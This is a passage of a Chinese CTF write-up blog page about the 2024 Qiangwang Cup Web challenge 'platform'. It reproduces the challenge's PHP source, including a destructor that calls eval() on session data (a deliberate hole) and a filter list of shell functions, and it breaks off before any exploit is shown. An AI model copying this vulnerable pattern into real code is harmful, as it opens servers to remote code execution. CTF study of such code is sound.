@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Octopus">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/03/05/2024强网杯部分web复现/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024强网杯部分Web复现">
+<meta property="og:url" content="http://example.com/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-03-05T12:44:03.000Z">
+<meta property="article:modified_time" content="2025-03-05T12:51:10.552Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/alphabet.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/alphabet.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/alphabet.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2024强网杯部分Web复现 | OctSec
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/121.jpg","dark":"/images/dark.jpg"},"title":"DaZhangYu","subtitle":{"text":["In the things I adore, discipline  finds its way.","Can you still hold on?"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"归档":{"path":"/archives","icon":"fa-regular fa-archive"},"分类":{"path":"/categories/","icon":"fa-regular fa-folder"},"友链":{"icon":"fa-regular fa-link","path":"/links/"},"关于":{"path":"/about/","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"初涉安全，请多指教","show_on_mobile":true,"links":{"标签":{"path":"/tags","icon":"fa-regular fa-tags"},"分类":{"path":"/categories","icon":"fa-regular fa-folder"},"工具":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/3/14 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                OctSec
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    友链
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about/"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                友链
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about/"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>标签</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/bookmarks/"
+                        >
+                            <span>工具</span>
+                            <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="/images/16.jpg" alt="2024强网杯部分Web复现" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">2024强网杯部分Web复现</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/octopus3.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Octopus</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-05 20:44:03</span>
+        <span class="mobile">2025-03-05 20:44:03</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-03-05 20:51:10</span>
+            <span class="mobile">2025-03-05 20:51:10</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/">Java安全审计</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="2024-强网杯-platform"><a href="#2024-强网杯-platform" class="headerlink" title="[2024 强网杯]platform"></a>[2024 强网杯]platform</h2><p><strong>考点：Session反序列化、字符串溢出减少</strong></p>
+<p>扫描目录得到源码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www.zip</span><br></pre></td></tr></table></figure></div>
+
+<p>源码如下</p>
+<p>index.php</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">require &#x27;user.php&#x27;;</span><br><span class="line">require &#x27;class.php&#x27;;</span><br><span class="line"></span><br><span class="line">$sessionManager = new SessionManager();</span><br><span class="line">$SessionRandom = new SessionRandom();</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#x27;user&#x27;] = $username;</span><br><span class="line"></span><br><span class="line">    if (!isset($_SESSION[&#x27;session_key&#x27;])) &#123;</span><br><span class="line">        $_SESSION[&#x27;session_key&#x27;] =$SessionRandom -&gt; generateRandomString();</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[&#x27;password&#x27;] = $password;</span><br><span class="line">    $result = $sessionManager-&gt;filterSensitiveFunctions();</span><br><span class="line">    header(&#x27;Location: dashboard.php&#x27;);</span><br><span class="line">    exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    require &#x27;login.php&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>class.php</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class notouchitsclass &#123;</span><br><span class="line">    public $data;</span><br><span class="line">    public function __construct($data) &#123;</span><br><span class="line">        $this-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class SessionRandom &#123;</span><br><span class="line">    public function generateRandomString() &#123;</span><br><span class="line">    $length = rand(1, 50);</span><br><span class="line"></span><br><span class="line">    $characters = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;;</span><br><span class="line">    $charactersLength = strlen($characters);</span><br><span class="line">    $randomString = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randomString .= $characters[rand(0, $charactersLength - 1)];</span><br><span class="line">    &#125;</span><br><span class="line">    return $randomString;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class SessionManager &#123;</span><br><span class="line">    private $sessionPath;</span><br><span class="line">    private $sessionId;</span><br><span class="line">    private $sensitiveFunctions = [&#x27;system&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;passthru&#x27;, &#x27;shell_exec&#x27;, &#x27;popen&#x27;, &#x27;proc_open&#x27;];</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        if (session_status() == PHP_SESSION_NONE) &#123;</span><br><span class="line">            throw new Exception(&quot;Session has not been started. Please start a session before using this class.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;sessionPath = session_save_path();</span><br><span class="line">        $this-&gt;sessionId = session_id();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function getSessionFilePath() &#123;</span><br><span class="line">        return $this-&gt;sessionPath . &quot;/sess_&quot; . $this-&gt;sessionId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function filterSensitiveFunctions() &#123;</span><br><span class="line">        $sessionFile = $this-&gt;getSessionFilePath();</span><br><span class="line"></span><br><span class="line">        if (file_exists($sessionFile)) &#123;</span><br><span class="line">            $sessionData = file_get_contents($sessionFile);</span><br><span class="line"></span><br><span class="line">            foreach ($this-&gt;sensitiveFunctions as $function) &#123;</span><br><span class="line">                if (strpos($sessionData, $function) !== false) &#123;</span><br><span class="line">                    $sessionData = str_replace($function, &#x27;&#x27;, $sessionData);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            file_put_contents($sessionFile, $sessionData);</span><br><span class="line"></span><br><span class="line">            return &quot;Sensitive functions have been filtered from the session file.&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &quot;Session file not found.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>login.php</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;用户登录&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: #f0f4f8;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">            margin: 0;</span><br><span class="line">        &#125;</span><br><span class="line">        h1 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            color: #333;</span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">        .login-container &#123;</span><br><span class="line">            background-color: #fff;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);</span><br><span class="line">            padding: 30px;</span><br><span class="line">            width: 300px;</span><br><span class="line">        &#125;</span><br><span class="line">        label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-bottom: 5px;</span><br><span class="line">            color: #555;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=&quot;text&quot;],</span><br><span class="line">        input[type=&quot;password&quot;] &#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 10px;</span><br><span class="line">            margin-bottom: 15px;</span><br><span class="line">            border: 1px solid #ddd;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=&quot;submit&quot;] &#123;</span><br><span class="line">            background-color: #007BFF;</span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            padding: 10px;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            width: 100%;</span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=&quot;submit&quot;]:hover &#123;</span><br><span class="line">            background-color: #0056b3;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;login-container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;用户登录&lt;/h1&gt;</span><br><span class="line">        &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span><br><span class="line">            &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;</span><br><span class="line">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>dashborad.php</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;class.php&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if (!isset($_SESSION[&#x27;user&#x27;])) &#123;</span><br><span class="line">    header(&#x27;Location: login.php&#x27;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span 